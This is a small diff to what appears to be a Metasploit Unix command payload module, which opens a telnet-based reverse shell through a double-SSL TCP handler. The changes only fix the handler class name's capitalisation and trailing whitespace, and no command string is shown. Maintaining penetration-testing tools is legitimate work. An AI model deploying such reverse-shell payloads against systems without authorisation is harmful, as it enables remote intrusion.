@@ -31,7 +31,7 @@ module Metasploit3
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'unix',
 			'Arch'          => ARCH_CMD,
-			'Handler'       => Msf::Handler::ReverseTcpDoubleSsl,
+			'Handler'       => Msf::Handler::ReverseTcpDoubleSSL,
 			'Session'       => Msf::Sessions::CommandShell,
 			'PayloadType'   => 'cmd',
 			'RequiredCmd'   => 'telnet',
@@ -47,7 +47,7 @@ module Metasploit3
 	# Constructs the payload
 	#
 	def generate
-		
+
 		return super + command_string
 	end
 
